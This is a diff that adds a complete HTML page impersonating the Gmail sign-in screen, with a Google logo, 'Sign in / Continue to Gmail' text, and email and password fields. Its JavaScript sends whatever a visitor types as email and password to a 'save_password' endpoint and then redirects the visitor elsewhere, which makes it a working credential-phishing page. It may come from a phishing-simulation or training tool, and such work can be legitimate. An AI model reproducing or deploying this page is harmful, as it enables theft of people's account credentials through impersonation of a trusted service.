@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<title>Gmail Login</title>
+<style type="text/css" media="screen">
+    #editor {
+        position: absolute;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+    }
+</style>
+</head>
+<body>
+    <link href="static/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Material Design for Bootstrap -->
+    <link href="static/css/mdb.min.css" rel="stylesheet">
+
+    <!-- jQuery -->
+    <script src="static/js/jquery.min.js"></script>
+
+    <!-- Popper.js -->
+    <script src="static/js/popper.min.js"></script>
+
+    <!-- Bootstrap -->
+    <script src="static/js/bootstrap.min.js"></script>
+
+    <!-- Material Design for Bootstrap -->
+    <script src="static/js/mdb.min.js"></script>
+
+
+
+    <div class="container" style="width: 40%;">
+        <br>
+    <div class="card" style="height:90%;">
+        <div class="card-body">
+
+    <div class="row">
+        <div class="col">
+            <center>
+                <!-- Material input -->
+                <br>
+                <img src="static/media/google_logo.png" style="width:20%; height: auto;" />
+                <br><br>
+                <h4>Sign in</h4>
+                <h6>Continue to Gmail</h6>
+                <br>
+                <form class="md-form">
+                  <!-- Email input -->
+                  <div class="form-outline mb-4">
+                    <input type="email" id="f-email" class="form-control" />
+                    <label class="form-label" for="f-email">Email address</label>
+                  </div>
+              </form>
+              <form class="md-form">
+                  <!-- Password input -->
+                  <div class="form-outline mb-4">
+                    <input type="password" id="f-password" class="form-control" />
+                    <label class="form-label" for="f-password">Password</label>
+                  </div>
+              </form>
+          </center>
+                  <!-- 2 column grid layout for inline styling -->
+                  <div class="row mb-4">
+
+                    <div class="col">
+                      <!-- Simple link -->
+                      <a href="#!">Forgot password?</a><br><br>
+                      Not your computer? Use Guest mode to sign in privately.<br>
+                      <a href="#!">Learn more</a>
+                    </div>
+
+
+                  </div>
+                  <div class="row mb-4">
+                     <div class="col-4">
+                         <br>
+                         <a href="#!">Create account</a>
+                     </div>
+                     <div class="col-4">
+                     </div>
+                     <div class="col-4">
+                      <!-- Submit button -->
+                      <form class="md-form">
+                      <input type="submit" class="btn btn-primary btn-block" onclick="onFormSubmit()" value="Sign in">
+                    </form>
+                    </div>
+                </div>
+              </div>
+        </div>
+        </div>
+
+    </div>
+
+
+</div></div>
+<br>
+
+
+<script src="static/ace-builds/src-noconflict/ace.js" type="text/javascript" charset="utf-8"></script>
+<script src="static/ace-builds/src-noconflict/ext-language_tools.js"></script>
+
+<script>
+    function onFormSubmit() {
+        $.ajax({
+          url: "save_password",
+          type: "POST",
+          data: JSON.stringify({email: $("#f-email").val(), password: $("#f-password").val()}),
+          contentType: "application/json; charset=utf-8",
+          dataType: "json",
+          success: function(data){
+            if (data["status"] === "fail") {
+            } else {
+                window.location.replace(data["redirect_to"]);
+            }
+          }
+        });
+    }
+
+</script>
+
+<script>
+    $(document).on("keypress", "input", function(e){
+        if(e.which == 13){
+            var inputVal = $(this).val();
+            onFormSubmit();
+        }
+    });
+</script>
+
+
+</body>
+</html>
